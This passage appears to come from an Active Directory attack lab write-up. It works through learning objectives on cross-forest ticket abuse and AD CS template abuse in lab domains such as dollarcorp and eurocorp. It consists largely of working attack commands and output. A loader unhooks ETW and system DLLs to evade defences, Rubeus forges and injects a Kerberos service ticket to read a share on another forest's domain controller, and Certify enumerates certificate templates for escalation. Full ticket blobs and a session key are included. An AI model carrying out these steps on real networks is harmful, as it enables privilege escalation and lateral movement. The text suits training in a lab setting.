5o4IBHjCCARqgAwIBAKKCAREEggENfYIBCTCCAQWgggEBMIH+MIH7oBswGaADAgEXoRIEEEV+EQZdCyVBYWVRKUjtYU+hHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoAAApBEYDzIwMjUwOTMwMDAxNTQ3WqURGA8yMDI1MDkzMDAwMTU0N1qmERgPMjAyNTA5MzAxMDE1NDdapxEYDzIwMjUxMDA3MDAxNTQ3WqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUw=
```

Copy the base64 encoded ticket from above and use it in the following command

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGFjCCBhKgAwIBBaEDAgEWooIE4jCCBN5hggTaM...

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket: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
[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/eurocorp-dc.eurocorp.LOCAL'
[*] Using domain controller: eurocorp-dc.eurocorp.LOCAL (172.16.15.1)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      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
      ZXVyb2NvcnAuTE9DQUw=

  ServiceName              :  cifs/eurocorp-dc.eurocorp.LOCAL
  ServiceRealm             :  EUROCORP.LOCAL
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  9/29/2025 5:16:43 PM
  EndTime                  :  9/30/2025 3:15:47 AM
  RenewTill                :  10/6/2025 5:15:47 PM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  8Cb+3rMzPu2ZDa+49VDLKQRYOXuqW/07jd8Uo/MMOSA=
```

Once the ticket is injected, we can access explicitly shared resources on eurocorp-dc

* C:\Windows\system32> dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```
Volume in drive \\eurocorp-dc.eurocorp.local\SharedwithDCorp has no label.
 Volume Serial Number is 1A5A-FDE2

 Directory of \\eurocorp-dc.eurocorp.local\SharedwithDCorp

11/16/2022  05:26 AM    <DIR>          .
11/15/2022  07:17 AM                29 secret.txt
               1 File(s)             29 bytes
               1 Dir(s)   7,451,525,120 bytes free
```

* C:\Windows\system32> type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt
```
Dollarcorp DAs can read this!
```

Note that the only way to enumerate accessible resources (service on a machine) in eurocorp would be 
to request a TGS for each one and then attempt to access it.

## Learning Objective 21:
```
• Check if AD CS is used by the target forest and find any vulnerable/abusable templates. 
• Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.
```
We can use the Certify tool to check for AD CS in moneycorp:

* C:\AD\Tools> C:\AD\Tools\Certify.exe cas
```

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'


[*] Root CAs

    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local



[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local


[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : moneycorp-MCORP-DC-CA
    DNS Hostname                  : mcorp-dc.moneycorp.local
    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
    Enrollment Agent Restrictions : None

    Enabled Certificate Templates:
        CA-Integration
        HTTPSCertificates
        SmartCardEnrollment-Agent
        SmartCardEnrollment-Users
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator

Certify completed in 00:00:32.5851624
```

We can list all the templates using the following command. Going through the output we can find some 
interesting templates

* C:\AD\Tools> C:\AD\Tools\Certify.exe find
```

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'

    Enterprise CA Name            : moneycorp-MCORP-DC-CA
    DNS Hostname                  : mcorp-dc.moneycorp.local
    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
    Enrollment Agent Restrictions : None

[*] Available Certificates Templates :

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : User
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Users            S-1-5-21-335606122-960912869-3279953914-513
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : EFS
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Encrypting File System
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Users            S-1-5-21-335606122-960912869-3279953914-513
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : Administrator
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Microsoft Trust List Signing, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : EFSRecovery
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : File Recovery
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : Machine
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Computers        S-1-5-21-335606122-960912869-3279953914-515
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : DomainController
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : WebServer
    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : <null>
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : DomainControllerAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : DirectoryEmailReplication
    Schema Version                        : 2
    Validity Period                       : 1 year
